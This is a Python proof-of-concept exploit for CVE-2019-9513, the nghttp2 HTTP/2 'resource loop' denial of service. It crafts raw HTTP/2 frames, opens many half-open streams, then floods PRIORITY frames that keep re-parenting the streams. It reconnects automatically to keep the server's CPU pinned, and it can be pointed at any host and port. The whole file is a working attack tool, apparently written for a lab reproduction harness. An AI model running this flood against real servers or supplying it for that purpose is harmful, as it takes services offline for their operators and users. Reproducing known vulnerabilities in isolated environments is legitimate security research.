#!/usr/bin/env python3
"""
PoC for CVE-2019-9513 - nghttp2 "Resource Loop" HTTP/2 priority-tree churn DoS.

Part of the Aug 2019 Netflix HTTP/2 DoS family (CWE-400, CVSS 7.5,
AV:N/PR:N/UI:N). Pre-auth over h2c cleartext.

Attack (per the Netflix advisory): open many request streams, then continually
RE-SHUFFLE their PRIORITY dependencies. nghttp2 <1.39.2 reinserts/rebalances the
priority tree on every inbound PRIORITY frame with no per-stream rate limit, so a
sustained flood of dependency reshuffles burns CPU on the server.

This is resource exhaustion, NOT memory corruption — there is no ASan abort.
The verdict is delivered by an external CPU watchdog (docker stats idle vs
attack); see the harness in the build report.

HTTP/2 framing is implemented by hand:
    frame = length(3 BE) | type(1) | flags(1) | R+streamid(4 BE) | payload
    PRIORITY (type 0x2): 5-byte payload = E+stream-dependency(4 BE) | weight(1)
    SETTINGS (type 0x4), HEADERS (type 0x1).

HEADERS use the smallest possible HPACK: the required pseudo-headers are emitted
as literal-header-without-indexing entries with literal (non-indexed) names, so
no dynamic table / Huffman is needed. nghttpd accepts them and creates a stream
(it may RST_STREAM after responding — that is fine, the priority node still
exists and stays churnable).

Usage: poc_cve_2019_9513.py [host] [port] [duration_seconds] [num_streams]
"""
import socket
import struct
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = float(sys.argv[3]) if len(sys.argv) > 3 else 18.0
num_streams = int(sys.argv[4]) if len(sys.argv) > 4 else 100

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_PRIORITY = 0x2
FRAME_SETTINGS = 0x4

FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4


def frame(ftype, flags, stream_id, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + struct.pack(">I", stream_id) + payload


def hpack_literal(name, value):
    """HPACK literal header field, never-indexed name (0x10), no Huffman."""
    name = name.encode() if isinstance(name, str) else name
    value = value.encode() if isinstance(value, str) else value
    out = b"\x10"  # literal, no indexing, new name (0001 0000)
    out += bytes([len(name)]) + name  # name len (<127) + raw name
    out += bytes([len(value)]) + value
    return out


def build_headers_block(authority, path="/"):
    return (
        hpack_literal(":method", "GET")
        + hpack_literal(":scheme", "http")
        + hpack_literal(":path", path)
        + hpack_literal(":authority", authority)
    )


def priority_payload(dep_stream, weight, exclusive=False):
    dep = dep_stream | (0x80000000 if exclusive else 0)
    return struct.pack(">I", dep) + bytes([weight & 0xFF])


def _drain(s):
    s.setblocking(False)
    try:
        while s.recv(65535):
            pass
    except (BlockingIOError, OSError):
        pass
    s.setblocking(True)


def open_connection():
    """New h2c connection: preface, SETTINGS handshake, then open streams."""
    s = socket.create_connection((host, port), timeout=10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    # Connection preface + our SETTINGS, then ACK the server's SETTINGS.
    s.sendall(PREFACE)
    s.sendall(frame(FRAME_SETTINGS, 0, 0, b""))
    s.sendall(frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
    time.sleep(0.05)
    _drain(s)

    # Open many request streams (odd IDs). END_HEADERS but NO END_STREAM so the
    # stream stays half-open and its priority node stays alive for churning.
    authority = f"{host}:{port}"
    hblock = build_headers_block(authority)
    stream_ids = list(range(1, 1 + 2 * num_streams, 2))
    buf = bytearray()
    for sid in stream_ids:
        buf += frame(FRAME_HEADERS, FLAG_END_HEADERS, sid, hblock)
    s.sendall(buf)
    _drain(s)
    return s, stream_ids


def main():
    print(f"[*] CVE-2019-9513 nghttp2 priority-churn DoS -> {host}:{port}")
    print(f"[*] streams={num_streams} duration={duration}s")

    s, stream_ids = open_connection()
    print(f"[*] Opened {len(stream_ids)} streams (IDs {stream_ids[0]}..{stream_ids[-1]})")

    # Sustained PRIORITY reshuffle flood. Each PRIORITY frame re-points a stream
    # at a *different* parent with a rotating weight and toggled exclusive bit,
    # forcing nghttp2 to detach + reinsert + rebalance the node in the dependency
    # tree on every frame. We auto-reconnect if the server tears the connection
    # down, so the CPU pressure is sustained for the full duration.
    print("[*] Flooding PRIORITY reshuffles ...")
    start = time.time()
    sent = 0
    rot = 0
    reconnects = 0
    n = len(stream_ids)
    BATCH = 2000  # frames per sendall to amortize syscalls and keep CPU pinned
    while time.time() - start < duration:
        try:
            batch = bytearray()
            for _ in range(BATCH):
                i = sent % n
                sid = stream_ids[i]
                # depend on a different stream each time (rotate), skip self
                dep_idx = (i + 1 + rot) % n
                if stream_ids[dep_idx] == sid:
                    dep_idx = (dep_idx + 1) % n
                dep = stream_ids[dep_idx]
                weight = (sent % 255) + 1  # 1..255
                exclusive = (sent & 1) == 0  # toggle exclusive -> re-parents siblings
                batch += frame(FRAME_PRIORITY, 0, sid, priority_payload(dep, weight, exclusive))
                sent += 1
                if i == n - 1:
                    rot += 1  # shift the whole dependency mapping each full sweep
            s.sendall(batch)
            _drain(s)
        except (BrokenPipeError, ConnectionResetError, OSError):
            # Server tore the connection down; reconnect and keep the pressure on.
            reconnects += 1
            try:
                s.close()
            except OSError:
                pass
            if time.time() - start >= duration:
                break
            try:
                s, stream_ids = open_connection()
                n = len(stream_ids)
            except OSError:
                time.sleep(0.05)

    elapsed = time.time() - start
    rate = sent / elapsed if elapsed else 0
    print(f"[*] Sent {sent} PRIORITY frames in {elapsed:.1f}s "
          f"({rate:,.0f} frames/s), {reconnects} reconnect(s)")
    try:
        s.close()
    except OSError:
        pass
    print("[*] Done. Watch `docker stats` for the CPU spike during the flood.")


if __name__ == "__main__":
    main()
